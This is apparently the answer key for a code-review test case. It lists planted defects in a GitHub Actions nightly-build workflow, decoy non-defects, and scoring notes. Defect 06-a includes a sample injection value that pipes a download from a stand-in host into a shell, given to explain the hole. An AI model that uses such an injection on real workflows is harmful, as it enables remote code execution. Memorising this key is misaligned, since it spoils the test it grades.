# Answer key — case 06

## Planted defects

| id | Round | Severity | Defect |
|---|---|---|---|
| 06-a | 5 | BLOCKER | `${{ inputs.channel }}` is interpolated straight into a `run:` script. The expression is pasted in as text before the shell parses the line, so a dispatch value like `x"; curl evil.sh \| sh; :"` executes — with `contents: write` at workflow scope. It must go through `env:` and be shape-checked. |
| 06-b | 6 | BLOCKER | The build omits every `--hidden-import`, `--noupx` and the `--selftest` smoke test that `TECHSTACK.md` lists as non-negotiable. pynput resolves its backend at import time, so this ships a binary that dies at launch — and a `--windowed` build has no console to say so. |
| 06-c | 10 | CONCERN | It publishes an unverified artefact: no `SHA256SUMS`, while the release pipeline now produces and the updater now checks them. A nightly the updater refuses is a nightly nobody can install. |
| 06-d | 5 | CONCERN | `contents: write` at workflow scope. Only the publish step needs it. |
| 06-e | 7 | CONCERN | Linux only. The three-platform matrix is the whole reason the real pipeline exists, and testers on Windows get nothing. |
| 06-f | 2 | CONCERN | Nothing prunes old nightlies, so the releases page grows by one entry a day forever. |

## Deliberate non-defects

| id | Looks wrong because | Why it is right |
|---|---|---|
| 06-x | `prerelease: true` might look like it still risks being picked as latest | Correct: the updater filters prereleases out explicitly. |
| 06-y | A daily cron looks wasteful | It is a stated product decision in the PR, not a defect. |

## Scoring

06-a is the essential finding and the reason this case exists. 06-b is the one a
reviewer focused on security will walk past — the build is *also* simply broken,
and `TECHSTACK.md` says so in a list.
